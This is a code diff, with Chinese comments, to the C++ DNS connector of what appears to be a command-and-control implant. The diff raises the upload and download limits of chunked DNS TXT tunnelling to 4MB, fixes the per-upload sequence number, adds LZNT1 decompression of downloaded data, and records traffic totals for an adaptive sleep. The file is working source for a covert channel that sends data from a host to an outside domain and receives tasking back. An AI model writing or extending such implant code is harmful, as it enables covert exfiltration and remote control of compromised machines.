@@ -500,10 +500,11 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         maxChunk -= headerSize;
 
         // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
-        const ULONG maxUploadSize = 1 << 20;
+        const ULONG maxUploadSize = 4 << 20; // 4MB
         if (total > maxUploadSize)
             total = maxUploadSize;
 
+        ULONG seqForSend = ++this->seq;
         ULONG offset = 0;
         while (offset < total) {
             ULONG chunk = total - offset;
@@ -534,13 +535,15 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             }
             MemFreeLocal((LPVOID*)&frame, frameSize);
 
-            BuildQName(this->sid, "PUT", ++this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+            BuildQName(this->sid, "PUT", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
             BYTE tmp[512];
             ULONG tmpSize = 0;
             DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
 
             offset += chunk;
         }
+        // 记录本次上行总量，供自适应 sleep 使用
+        this->lastUpTotal = total;
         return;
     }
 
@@ -593,7 +596,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             offset |= ((ULONG)respBuf[6] << 8);
             offset |= ((ULONG)respBuf[7] << 0);
             ULONG chunkLen = respSize - headerSize;
-            const ULONG maxDownloadSize = 1 << 20;
+            const ULONG maxDownloadSize = 4 << 20; // 4MB
             if (total > 0 && total <= maxDownloadSize && offset < total) {
                 if (!this->downBuf || this->downTotal != total) {
                     if (this->downBuf && this->downTotal) {
@@ -615,8 +618,45 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 memcpy(this->downBuf + offset, respBuf + headerSize, n);
                 this->downFilled += n;
                 if (this->downFilled >= this->downTotal) {
-                    this->recvData = this->downBuf;
-                    this->recvSize = (int)this->downTotal;
+                    // 解析压缩头：1 字节 flags + 4 字节原始长度（小端）。
+                    BYTE* finalBuf   = this->downBuf;
+                    ULONG finalSize  = this->downTotal;
+                    if (this->downTotal > 5) {
+                        BYTE  flags = this->downBuf[0];
+                        ULONG orig  = 0;
+                        orig |= (ULONG)this->downBuf[1];
+                        orig |= ((ULONG)this->downBuf[2] << 8);
+                        orig |= ((ULONG)this->downBuf[3] << 16);
+                        orig |= ((ULONG)this->downBuf[4] << 24);
+                        if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
+                            // 尝试解压缩
+                            ULONG ws1 = 0, ws2 = 0;
+                            if (NT_SUCCESS(ApiNt->RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &ws1, &ws2))) {
+                                PVOID work = MemAllocLocal(ws1);
+                                if (work) {
+                                    BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
+                                    if (outBuf) {
+                                        ULONG outSize = 0;
+                                        NTSTATUS st = ApiNt->RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, outBuf, orig, this->downBuf + 5, this->downTotal - 5, &outSize);
+                                        if (NT_SUCCESS(st) && outSize == orig) {
+                                            // 使用解压后的缓冲
+                                            finalBuf  = outBuf;
+                                            finalSize = outSize;
+                                            // 原始压缩缓冲释放
+                                            MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+                                        } else {
+                                            MemFreeLocal((LPVOID*)&outBuf, orig);
+                                        }
+                                    }
+                                    MemFreeLocal(&work, ws1);
+                                }
+                            }
+                        }
+                    }
+                    this->recvData = finalBuf;
+                    this->recvSize = (int)finalSize;
+                    // 记录本次下行总量，供自适应 sleep 使用
+                    this->lastDownTotal = finalSize;
                     this->downBuf    = NULL;
                     this->downTotal  = 0;
                     this->downFilled = 0;
